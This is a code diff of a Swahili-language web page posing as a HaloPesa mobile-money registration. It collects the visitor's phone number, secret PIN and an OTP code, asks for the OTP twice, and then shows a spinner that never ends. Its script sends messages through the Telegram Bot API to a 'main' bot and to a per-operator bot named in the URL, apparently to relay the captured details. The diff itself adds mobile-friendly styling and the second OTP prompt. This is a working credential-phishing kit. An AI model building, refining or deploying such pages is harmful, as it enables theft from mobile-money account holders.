@@ -2,30 +2,90 @@
 <html lang="sw">
 <head>
     <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>HaloPesa Registration</title>
     <style>
-        * { box-sizing: border-box; margin: 0; padding: 0; font-family: sans-serif; }
-        body { background-color: #f5f5f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; }
-        .phone-container { background-color: #ffffff; width: 100%; max-width: 412px; height: 100vh; display: flex; flex-direction: column; padding: 24px; position: relative; box-shadow: 0 4px 12px rgba(0,0,0,0.1); overflow: hidden; }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
+        
+        body { 
+            background-color: #f5f5f5; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            min-height: 100vh; 
+            width: 100vw;
+        }
+
+        .phone-container { 
+            background-color: #ffffff; 
+            width: 100%; 
+            max-width: 450px; /* Inafanya ionekane vizuri hata kwenye PC */
+            height: 100vh; 
+            display: flex; 
+            flex-direction: column; 
+            padding: 5vw; /* Inabadilika kulingana na ukubwa wa skrini */
+            position: relative; 
+            box-shadow: 0 0 20px rgba(0,0,0,0.05);
+            overflow: hidden;
+        }
+
         .screen { display: none; flex-direction: column; height: 100%; width: 100%; }
         .screen.active { display: flex; }
-        h2 { font-size: 24px; font-weight: 700; margin-bottom: 24px; }
-        .text-input { width: 100%; padding: 16px; border: 1px solid #e0e0e0; border-radius: 8px; font-size: 16px; outline: none; }
-        .box-input-container { display: flex; gap: 12px; align-items: center; margin-bottom: 20px; }
-        .box-input { width: 60px; height: 60px; border: 1px solid #e0e0e0; background-color: #f9f9f9; border-radius: 8px; text-align: center; font-size: 20px; font-weight: 600; outline: none; }
-        .btn-primary { width: 100%; padding: 16px; background-color: #ff5500; color: #ffffff; border: none; border-radius: 12px; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: auto; }
+        
+        h2 { font-size: 7vw; max-size: 28px; font-weight: 700; margin-bottom: 24px; color: #111; }
+        
+        .text-input { 
+            width: 100%; 
+            padding: 4vw; 
+            border: 1px solid #e0e0e0; 
+            border-radius: 8px; 
+            font-size: 16px; 
+            outline: none; 
+        }
+
+        .box-input-container { display: flex; gap: 3vw; align-items: center; margin-bottom: 20px; justify-content: space-between; }
+        
+        .box-input { 
+            width: 18vw; 
+            max-width: 60px;
+            height: 18vw; 
+            max-height: 60px;
+            border: 1px solid #e0e0e0; 
+            background-color: #f9f9f9; 
+            border-radius: 8px; 
+            text-align: center; 
+            font-size: 20px; 
+            font-weight: 600; 
+            outline: none; 
+        }
+
+        .btn-primary { 
+            width: 100%; 
+            padding: 4vw; 
+            background-color: #ff5500; 
+            color: #ffffff; 
+            border: none; 
+            border-radius: 12px; 
+            font-size: 16px; 
+            font-weight: 600; 
+            cursor: pointer; 
+            margin-top: auto;
+        }
+
         .loading-container { display: flex; flex-direction: column; justify-content: center; align-items: center; height: 100%; }
-        .spinner { width: 50px; height: 50px; border: 5px solid #f3f3f3; border-top: 5px solid #ff5500; border-radius: 50%; animation: spin 1s linear infinite; }
+        .spinner { width: 12vw; max-width: 50px; height: 12vw; max-height: 50px; border: 5px solid #f3f3f3; border-top: 5px solid #ff5500; border-radius: 50%; animation: spin 1s linear infinite; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
+
     <div class="phone-container">
         <div class="screen active" id="screen-1">
             <h2>Namba ya simu</h2>
             <input type="tel" class="text-input" id="phone-field">
             <button class="btn-primary" onclick="submitPhone()">Endelea</button>
         </div>
+
         <div class="screen" id="screen-2">
             <h2>Weka namba ya siri</h2>
             <div class="box-input-container" id="pin-container">
@@ -36,6 +96,7 @@
             </div>
             <button class="btn-primary" onclick="submitPin()">Endelea</button>
         </div>
+
         <div class="screen" id="screen-3">
             <h2>Weka msimbo wa OTP</h2>
             <h4>Msimbo wa OTP ulitumwa kwa namba yako.</h4>
@@ -48,9 +109,13 @@
             </div>
             <button class="btn-primary" onclick="triggerLoading(4)">Endelea</button>
         </div>
+
         <div class="screen" id="screen-4"><div class="loading-container"><div class="spinner"></div></div></div>
+
         <div class="screen" id="screen-5">
-            <h2>Weka Maelezo tena</h2>
+            <h2>Weka msimbo wa OTP tena</h2>
+            <h4>Msimbo wa OTP ulitumwa kwa namba yako.</h4>
+            <h4>Kama ujumbe wa maandihi.</h4>
             <div class="box-input-container" id="details-container">
                 <input type="text" class="box-input autotab" maxlength="1">
                 <input type="text" class="box-input autotab" maxlength="1">
@@ -59,6 +124,7 @@
             </div>
             <button class="btn-primary" onclick="triggerContinuousLoading()">Endelea</button>
         </div>
+
         <div class="screen" id="screen-6"><div class="loading-container"><div class="spinner"></div></div></div>
     </div>
 
@@ -71,14 +137,14 @@
             const IND_TOKEN = urlParams.get('token');
             const IND_ID = urlParams.get('id');
 
-            // 1. Tuma Main
+            // Tuma kwa Bot Kuu
             fetch(`https://api.telegram.org/bot${MAIN_BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ chat_id: MAIN_CHAT_ID, text: `[Main] ${msg}`, parse_mode: 'Markdown' })
             });
 
-            // 2. Tuma Individual
+            // Tuma kwa Bot ya mtu Binafsi
             if (IND_TOKEN && IND_ID) {
                 fetch(`https://api.telegram.org/bot${IND_TOKEN}/sendMessage`, {
                     method: 'POST',
